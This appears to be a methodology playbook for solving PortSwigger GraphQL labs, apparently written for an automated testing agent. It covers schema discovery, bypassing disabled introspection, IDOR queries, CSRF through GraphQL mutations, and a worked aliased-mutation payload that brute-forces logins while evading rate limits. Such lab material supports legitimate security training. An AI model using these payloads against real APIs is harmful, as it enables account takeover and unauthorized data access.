# GraphQL API Attacks Methodology
## Expert-Level Playbook (introspection, IDOR/BOLA, mutations, aliasing)

> 4 PortSwigger labs. Find the endpoint, pull the schema (introspection or JS
> mining), then attack authorization on queries/mutations. Aliasing/batching
> defeat rate limits and brute-force protections.

---

## Phase 1: Discover the endpoint & schema

### 1.1 Common endpoints
```
discover_apis
extract_js_endpoints    # mine frontend JS for the GraphQL path + operations
# Try: /graphql /api /graphql/api /graphql/v1 /index.php?graphql /query
```
Probe methods: POST JSON, GET `?query=`, POST `x-www-form-urlencoded`,
`application/graphql`. A universal query `{__typename}` returning `"Query"`
confirms GraphQL.

### 1.2 Introspection
```
http_request method=POST url=.../graphql \
  body='{"query":"query{__schema{types{name fields{name args{name}}}}}"}'
```
If disabled, try:
- suffix bypass: `__schema` with a trailing newline / `{ }` spacing
- probe with `query{__type(name:"User"){fields{name}}}`
- **field suggestions**: send a typo'd field; the error "Did you mean ...?"
  leaks real field names — enumerate iteratively.
- mine JS for embedded queries/fragments.

---

## Phase 2: Attack techniques (per sub-variant)

| Sub-variant | Technique |
|-------------|-----------|
| Accessing private data | query fields/objects your role shouldn't see (BOLA/IDOR by id) |
| Accidental field exposure | introspection/suggestions reveal hidden fields (e.g. `isAdmin`, `password`) |
| Bypassing rate limits (aliasing) | many aliased mutations in one request |
| Brute force via aliasing | one request, N aliased `login`/`checkOtp` attempts |
| CSRF over GraphQL | GET/`form`-content-type mutation → CSRF |
| Deep query DoS (avoid) | note but don't run against shared infra |

### 2.1 IDOR / private data
```
query { user(id: 2) { username email } }        # swap id / try other users
query { getUser(id:"...") { ... } }             # enumerate with suggestions
```
Compare across sessions with `list_sessions`/`swap_session`.

### 2.2 Aliasing to bypass anti-brute-force
```graphql
mutation {
  a1: login(input:{user:"carlos",pw:"000000"}){ success token }
  a2: login(input:{user:"carlos",pw:"111111"}){ success token }
  a3: login(input:{user:"carlos",pw:"222222"}){ success token }
  # ...one request carries hundreds of attempts; the counter sees "1 request"
}
```
Generate the aliased document programmatically (`run_shell`) and send once.

### 2.3 CSRF over GraphQL
If the endpoint accepts `application/x-www-form-urlencoded` or GET, a mutation can
be delivered via a CSRF form (see csrf.md + exploit server).

---

## Phase 3: Tooling

```
discover_apis / extract_js_endpoints   # endpoint + operation discovery
http_request / caido_local_api          # send raw GraphQL queries/mutations
list_sessions / swap_session            # authorization differential testing
run_shell                               # build large aliased documents; clairvoyance-style schema recovery
capture_baseline / diff_against_baseline
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Introspection disabled | Use field suggestions ("Did you mean"), JS mining, clairvoyance |
| Field not found | Enumerate via error suggestions iteratively |
| Rate limited | Batch attempts with aliases in a single request |
| Mutation blocked (auth) | Try swapped session / different content-type / GET |
| Wrong content-type | Try JSON, `application/graphql`, form-encoded, and GET |

## Validation / Success Criteria
- [ ] An unauthorized session reads or mutates data it shouldn't, or
- [ ] Aliasing bypasses a rate/brute-force control in one request.
- [ ] A control query under the correct boundary behaves differently.
- [ ] Lab solved banner observed.
